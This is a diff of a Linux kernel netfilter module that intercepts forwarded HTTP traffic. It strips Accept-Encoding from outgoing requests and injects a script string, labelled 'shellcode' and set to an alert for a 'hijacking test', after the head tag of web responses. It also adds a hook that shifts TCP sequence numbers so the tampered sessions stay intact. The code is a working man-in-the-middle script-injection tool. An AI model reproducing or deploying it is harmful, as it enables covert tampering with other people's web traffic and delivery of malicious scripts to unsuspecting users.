@@ -15,72 +15,12 @@
 #include <net/checksum.h>
 #include <net/netfilter/nf_conntrack.h>
 #include <net/netfilter/nf_conntrack_helper.h>
-// #include <net/netfilter/nf_conntrack_expect.h>
+#include <net/netfilter/nf_conntrack_expect.h>
 #include <net/netfilter/nf_nat.h>
-// #include <net/netfilter/nf_nat_core.h>
+#include <net/netfilter/nf_nat_core.h>
 #include <net/netfilter/nf_nat_helper.h>
 
-char shellcode[] = "<head>\n<script>alert('hijacking test')</script>";
-
-// typedef struct Pseudo_Header {
-// 	unsigned int saddr;
-// 	unsigned int daddr;
-// 	unsigned char res;
-// 	unsigned char proto;
-// 	unsigned short len;
-// }pse_hd;
-
-// unsigned short checksum(unsigned short *addr, int len) {
-// 	int nleft = len;
-// 	int sum = 0;
-
-// 	uint16_t * w = addr;
-// 	uint16_t answer = 0;
-
-// 	while (nleft > 1) {
-// 		sum += *w++;
-// 		nleft -= sizeof(uint16_t);
-// 	}
-
-// 	if (nleft == 1) {
-// 		*(uint8_t *) (&answer) = *(uint8_t *) w;
-// 		sum += answer;
-// 	}
-
-// 	sum = (sum >> 16) + (sum & 0xFFFF);
-// 	sum += (sum >> 16);
-// 	answer = ~sum;
-// 	return (answer);
-// }
-
-// unsigned short checksum_tcp(struct iphdr *ip_hd, struct tcphdr *tcp_hd)
-// {
-// 	unsigned short tcp_len;
-// 	unsigned short ret = 0;
-// 	unsigned short ip_len = 0;
-// 	char *buf = NULL;
-// 	ip_len = (ip_hd->ihl & 0x0f) * 4;
-// 	tcp_len = ntohs(ip_hd->tot_len) - ((ip_hd->ihl & 0x0f) * 4);
-// 	buf = kmalloc(tcp_len + sizeof(pse_hd), GFP_KERNEL);
-// 	if(buf == NULL)
-// 	{
-// 		printk(KERN_ALERT "hook_ipv4: Error in malloc mem\n");
-// 		return 0;
-// 	}
-
-// 	pse_hd *phd = (pse_hd *)buf;
-// 	phd->saddr = ip_hd->saddr;
-// 	phd->daddr = ip_hd->daddr;
-// 	phd->res = 0;
-// 	phd->proto = IPPROTO_TCP;
-// 	phd->len = htons(tcp_len);
-// 	memcpy(buf+sizeof(pse_hd),tcp_hd,tcp_len);
-// 	tcp_hd = (struct tcphdr *)(buf+sizeof(pse_hd));
-// 	tcp_hd->check = 0;
-// 	ret = checksum((unsigned short *)buf, tcp_len+sizeof(pse_hd));
-// 	kfree(buf);
-// 	return ret; 
-// }
+char shellcode[] = "<script>alert('hijacking test')</script>";
 
 int delete_accept_encoding(char *pkg)
 {
@@ -110,38 +50,8 @@ int delete_accept_encoding(char *pkg)
 	return 1;
 }
 
-// int delete_transfer_encoding(char *pkg)
-// {
-// 	char *pK = NULL;
-// 	char *pV = NULL;
-// 	int len = 0;
-	
-// 	pK = strstr(pkg,"Transfer-Encoding:");
-// 	if(pK == NULL)
-// 		return 0;
-	
-// 	printk(KERN_ALERT "hook_ipv4: Transfer-Encoding found\n");
-	
-// 	pV = strstr(pK,"\r\n");
-// 	if(pV == NULL)
-// 		return 0;
-	
-// 	len = (long long)pV - (long long)pK;
-	
-	
-// 	// memset(pK,' ',len + 2);
-// 	memcpy(pK+18, "identity", 8);
-
-// 	printk(KERN_ALERT "hook_ipv4: Delete Transfer-Encoding: \n%s\n",pK);
-
-// 	return 1;
-// }
-
 unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
 {
-	if (0 != skb_linearize(skb)) {
-        return NF_ACCEPT;
-    }
 	struct iphdr *iph = ip_hdr(skb);
 
 	if (iph->protocol == IPPROTO_TCP)
@@ -152,15 +62,16 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 
 		unsigned int src_port = (unsigned int)ntohs(tcph->source);
 		unsigned int dest_port = (unsigned int)ntohs(tcph->dest);
+
+		if (0 != skb_linearize(skb)) {
+	        return NF_ACCEPT;
+	    }
 		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &src_ip, src_port, &dest_ip, dest_port);
 		
 		// char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));
 		char *pkg = (char *)skb->data + 40;
-
-		// HTTP 1.1 --> HTTP 1.0
-		char *pK = strstr(pkg,"HTTP/1.1");
-		if(pK == NULL) return NF_ACCEPT;
-		memcpy(pK, "HTTP/1.0", 8);
+		
+		// printk(KERN_ALERT "---%d->%d\n", src_port,dest_port);
 
 		if (src_port == 80)
 		{
@@ -174,89 +85,41 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 				return NF_ACCEPT;
 			}
 
+		    // pskb_expand_head(skb, 0, strlen(shellcode), GFP_ATOMIC);
+			// char *tail = skb_put(skb, strlen(shellcode));
+			// while(tail > phead)
+			// {
+			// 	tail--;
+			// 	*(tail + strlen(shellcode)) = *tail;
+			// }
+			// memcpy(phead, shellcode, strlen(shellcode));
+
+			// iph->tot_len = htons(skb->len);
+			// ip_send_check(iph);
+
 			enum ip_conntrack_info ctinfo;
 			struct nf_conn *ct = nf_ct_get(skb, &ctinfo);
-			// delete_transfer_encoding(pkg);
+		    // set_bit(IPS_SEQ_ADJUST_BIT, &ct->status);
 
-			// printk(KERN_ALERT "---pkg size1: %d\n", strlen(pkg));
-			// printk(KERN_ALERT "%s\n", pkg+strlen(pkg)-20);
-			// printk(KERN_ALERT "---hook_ipv4: Found Head tag---\n");
 			// sudo iptables -t nat --list
-			if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo, iph->ihl * 4,
-                                        (int)(phead - pkg), 6,
-                                        shellcode, strlen(shellcode))) 
+			if (ct && __nf_nat_mangle_tcp_packet(skb, ct, ctinfo,
+                                        (int)(phead - pkg) + 6, 0,
+                                        shellcode, strlen(shellcode), true)) 
 			{
-                skb->local_df = 1;
+                // skb->local_df = 1;
             	// skb_shinfo(skb)->gso_size = 0;
 
                 printk(KERN_ALERT "hook_ipv4: ---insert success---\n");
             }
-            // kfree(pkg);
 
-            // pkg = (char *)((long long)tcph + ((tcph->doff) * 4));
-            // pkg = (char *)skb->data + 40;
-            // printk(KERN_ALERT "---pkg size2: %d\n", strlen(pkg));
-			// printk(KERN_ALERT "%s\n", pkg+strlen(pkg)-20);
-			///////////////////change chunk size////////////////////////
-			// char *pr1 = strstr(pkg,"<");
-			// char *pr2 = pr1 - 2; 
-			// pr1 -= 3;
-
-			// while(*pr1 != '\n' && *pr1 != '\r')
-			// {
-			// 	pr1 --;
-			// }
-			// pr1 ++;
-
-			// char *chunk_size_str = (char*)kmalloc(pr2 - pr1 + 1, GFP_KERNEL);
-			// memcpy(chunk_size_str, pr1, pr2 - pr1);
-			// memset(chunk_size_str + (pr2 - pr1), '\0', 1);
-			
-			// int chunk_size; 
-			// sscanf(chunk_size_str, "%x", &chunk_size);
-
-			// printk(KERN_ALERT "%s --> %d\n", chunk_size_str, chunk_size);
-
-			// chunk_size += strlen(shellcode);
-			// sprintf(chunk_size_str, "%x", chunk_size);
-			// printk(KERN_ALERT "%d --> %s\n", chunk_size, chunk_size_str);
-
-			// memcpy(pr1, chunk_size_str, strlen(chunk_size_str));
-			// kfree(chunk_size_str);
-			////////////////////////////////////////////////////////////
-			
-			// char content_len[256];
-			// sprintf(content_len,"\r\n%s%d\r\n","Content-Length: ", 2000);
-
-			// char *pK = strstr(pkg,"Content-Type:");
-			// pK = strstr(pK,"\r\n");
-			// if(pK == NULL)
-			// 	return NF_ACCEPT;
-			// if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo,iph_len,
-   //                                      pK - pkg, 2,
-   //                                      content_len, strlen(content_len))) 
-			// {
-   //          	// printk(KERN_ALERT "%s\n",pK);
-   //          }
-
-   //          printk(KERN_ALERT "%d\n", skb->len);
-            
-   //          char content_len[256];
-			// sprintf(content_len,"\r\n%s%d\r\n","Content-Length: ", 200);
-
-			// char *pK = strstr(pkg,"Content-Type:");
-			// pK = strstr(pK,"\r\n");
-			// if(pK == NULL)
-			// 	return NF_ACCEPT;
-			// if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo, iph->ihl * 4,
-   //                                      pK - pkg, 2,
-   //                                      content_len, strlen(content_len))) 
-			// {
-   //          	printk(KERN_ALERT "hook_ipv4: ---fix Content-Length success---\n");
-   //          }
 		}
 		else if (dest_port == 80)
 		{
+			// // HTTP 1.1 --> HTTP 1.0
+			// char *pK = strstr(pkg,"HTTP/1.1");
+			// if(pK == NULL) return NF_ACCEPT;
+			// memcpy(pK, "HTTP/1.0", 8);
+
 			if (memcmp(pkg,"GET",strlen("GET")) != 0)
 			{
 				return NF_ACCEPT;
@@ -264,34 +127,219 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 
 			delete_accept_encoding(pkg);
 
-			// checksum
-			// skb
-            skb->ip_summed = CHECKSUM_PARTIAL;
-            skb->csum_start = skb_headroom(skb)+ skb_network_offset(skb) + iph->ihl * 4;
-            skb->csum_offset = offsetof(struct tcphdr, check);
-            // ip
-            iph->check = 0;
-            iph->check = ip_fast_csum(iph, iph->ihl);
-            // tcp
-            tcph->check = 0;
-            tcph->check = ~tcp_v4_check(skb->len-iph->ihl*4, iph->saddr, iph->daddr, 0);
+			int datalen = skb->len - iph->ihl*4;
+			skb->ip_summed = CHECKSUM_PARTIAL;
+			skb->csum_start = skb_headroom(skb) + skb_network_offset(skb) + iph->ihl * 4;
+			skb->csum_offset = offsetof(struct tcphdr, check);
+	        // ip
+	        iph->check = 0;
+	        iph->check = ip_fast_csum(iph, iph->ihl);
+	        // tcp
+	        tcph->check = 0;
+			tcph->check = ~csum_tcpudp_magic(iph->saddr, iph->daddr,
+						    datalen, iph->protocol, 0);
 		}
 	}
 	return NF_ACCEPT;
 }
 
-static struct nf_hook_ops http_hooks = 
-{ 
-	.pf = NFPROTO_IPV4,
-    // .priority = NF_IP_PRI_MANGLE, 
-    .priority = NF_IP_PRI_CONNTRACK_DEFRAG, 
-    .hooknum = NF_INET_FORWARD, 
-    .hook = hook_func,
+/* Adjust one found SACK option including checksum correction */
+static void
+sack_adjust(struct sk_buff *skb,
+	    struct tcphdr *tcph,
+	    unsigned int sackoff,
+	    unsigned int sackend,
+	    struct nf_nat_seq *natseq)
+{
+	while (sackoff < sackend) {
+		struct tcp_sack_block_wire *sack;
+		__be32 new_start_seq, new_end_seq;
+
+		sack = (void *)skb->data + sackoff;
+		if (after(ntohl(sack->start_seq) - natseq->offset_before,
+			  natseq->correction_pos))
+			new_start_seq = htonl(ntohl(sack->start_seq)
+					- natseq->offset_after);
+		else
+			new_start_seq = htonl(ntohl(sack->start_seq)
+					- natseq->offset_before);
+
+		if (after(ntohl(sack->end_seq) - natseq->offset_before,
+			  natseq->correction_pos))
+			new_end_seq = htonl(ntohl(sack->end_seq)
+				      - natseq->offset_after);
+		else
+			new_end_seq = htonl(ntohl(sack->end_seq)
+				      - natseq->offset_before);
+
+		pr_debug("sack_adjust: start_seq: %d->%d, end_seq: %d->%d\n",
+			 ntohl(sack->start_seq), new_start_seq,
+			 ntohl(sack->end_seq), new_end_seq);
+
+		inet_proto_csum_replace4(&tcph->check, skb,
+					 sack->start_seq, new_start_seq, 0);
+		inet_proto_csum_replace4(&tcph->check, skb,
+					 sack->end_seq, new_end_seq, 0);
+		sack->start_seq = new_start_seq;
+		sack->end_seq = new_end_seq;
+		sackoff += sizeof(*sack);
+	}
+}
+
+/* TCP SACK sequence number adjustment */
+static inline unsigned int
+nf_nat_sack_adjust(struct sk_buff *skb,
+		   struct tcphdr *tcph,
+		   struct nf_conn *ct,
+		   enum ip_conntrack_info ctinfo)
+{
+	unsigned int dir, optoff, optend;
+	struct nf_conn_nat *nat = nfct_nat(ct);
+
+	optoff = ip_hdrlen(skb) + sizeof(struct tcphdr);
+	optend = ip_hdrlen(skb) + tcph->doff * 4;
+
+	if (!skb_make_writable(skb, optend))
+		return 0;
+
+	dir = CTINFO2DIR(ctinfo);
+
+	while (optoff < optend) {
+		/* Usually: option, length. */
+		unsigned char *op = skb->data + optoff;
+
+		switch (op[0]) {
+		case TCPOPT_EOL:
+			return 1;
+		case TCPOPT_NOP:
+			optoff++;
+			continue;
+		default:
+			/* no partial options */
+			if (optoff + 1 == optend ||
+			    optoff + op[1] > optend ||
+			    op[1] < 2)
+				return 0;
+			if (op[0] == TCPOPT_SACK &&
+			    op[1] >= 2+TCPOLEN_SACK_PERBLOCK &&
+			    ((op[1] - 2) % TCPOLEN_SACK_PERBLOCK) == 0){
+				sack_adjust(skb, tcph, optoff+2,  optoff+op[1], &nat->seq[!dir]);
+			}
+			optoff += op[1];
+		}
+	}
+	return 1;
+}
+
+/* TCP sequence number adjustment.  Returns 1 on success, 0 on failure */
+int
+nf_nat_seq_adjust(struct sk_buff *skb,
+		  struct nf_conn *ct,
+		  enum ip_conntrack_info ctinfo)
+{
+	struct tcphdr *tcph;
+	int dir;
+	__be32 newseq, newack;
+	s16 seqoff, ackoff;
+	struct nf_conn_nat *nat = nfct_nat(ct);
+	struct nf_nat_seq *this_way, *other_way;
+
+	dir = CTINFO2DIR(ctinfo);
+
+	this_way = &nat->seq[dir];
+	other_way = &nat->seq[!dir];
+
+	if (!skb_make_writable(skb, ip_hdrlen(skb) + sizeof(*tcph)))
+		return 0;
+
+	tcph = (void *)skb->data + ip_hdrlen(skb);
+	if (after(ntohl(tcph->seq), this_way->correction_pos))
+		seqoff = this_way->offset_after;
+	else
+		seqoff = this_way->offset_before;
+
+	if (after(ntohl(tcph->ack_seq) - other_way->offset_before,
+		  other_way->correction_pos))
+		ackoff = other_way->offset_after;
+	else
+		ackoff = other_way->offset_before;
+
+	printk(KERN_ALERT "---%d--%d", ntohl(tcph->seq),ntohl(tcph->ack_seq));
+	newseq = htonl(ntohl(tcph->seq) + seqoff);
+	newack = htonl(ntohl(tcph->ack_seq) - ackoff);
+
+	inet_proto_csum_replace4(&tcph->check, skb, tcph->seq, newseq, 0);
+	inet_proto_csum_replace4(&tcph->check, skb, tcph->ack_seq, newack, 0);
+
+	// printk("Adjusting sequence number from %u->%u, ack from %u->%u\n",
+	// 	 ntohl(tcph->seq), ntohl(newseq), ntohl(tcph->ack_seq),
+	// 	 ntohl(newack));
+
+	tcph->seq = newseq;
+	tcph->ack_seq = newack;
+
+	return nf_nat_sack_adjust(skb, tcph, ct, ctinfo);
+}
+
+
+unsigned int fix_seq(unsigned int hooknum, struct sk_buff *skb,
+        const struct net_device *in, const struct net_device *out, int(*okfn)(
+                struct sk_buff *))
+{
+    enum ip_conntrack_info ctinfo;
+    struct nf_conn *ct = nf_ct_get(skb, &ctinfo);
+
+    if (ct  &&  test_bit(IPS_SEQ_ADJUST_BIT, &ct->status) && (ctinfo != IP_CT_RELATED + IP_CT_IS_REPLY)  ) {
+
+		// enum ip_conntrack_info ctinfo;
+		// struct nf_conn *ct = nf_ct_get(skb, &ctinfo);
+		// nf_nat_seq_adjust(skb, ct, ctinfo);
+        struct iphdr *iph = ip_hdr(skb);
+
+		if (iph->protocol == IPPROTO_TCP)
+		{	
+			struct tcphdr *tcph = (void *)iph + iph->ihl * 4;
+
+			__be32 newseq = htonl(ntohl(tcph->seq) + strlen(shellcode));
+			// __be32 newack = htonl(ntohl(tcph->ack_seq) - 10000000);
+
+	        tcph->seq = newseq;
+			// tcph->ack_seq = newack;
+
+		}
+    }
+
+    return NF_ACCEPT;
+  
+}
+
+static struct nf_hook_ops http_hooks[] = {
+    { 
+	    .hook 			= hook_func,
+		.pf 			= NFPROTO_IPV4,
+	    .hooknum 		= NF_INET_FORWARD, 
+	    .priority 		= NF_IP_PRI_MANGLE,
+	    .owner			= THIS_MODULE
+	},
+    {
+	    .hook           = fix_seq,
+	    .pf             = PF_INET,
+	    .hooknum        = NF_INET_PRE_ROUTING,
+    	.priority       = NF_IP_PRI_CONNTRACK_CONFIRM,
+	    .owner			= THIS_MODULE
+    },
+    // {
+    //     .hook           = fix_seq,
+    //     .pf             = PF_INET,
+    //     .hooknum        = NF_INET_LOCAL_OUT,
+    //     .priority       = NF_IP_PRI_CONNTRACK_CONFIRM,
+	   //  .owner			= THIS_MODULE
+    // },
 };
 
 int init_module(void)
 {
-	nf_register_hook(&http_hooks);
+	nf_register_hooks(http_hooks, ARRAY_SIZE(http_hooks));
 
 	printk(KERN_ALERT "hook_ipv4: insmod\n");
 
@@ -300,7 +348,7 @@ int init_module(void)
 
 void cleanup_module(void)
 {
-	nf_unregister_hook(&http_hooks);
+	nf_unregister_hooks(http_hooks, ARRAY_SIZE(http_hooks));
 
 	printk(KERN_ALERT "hook_ipv4: rmmod\n");
 }
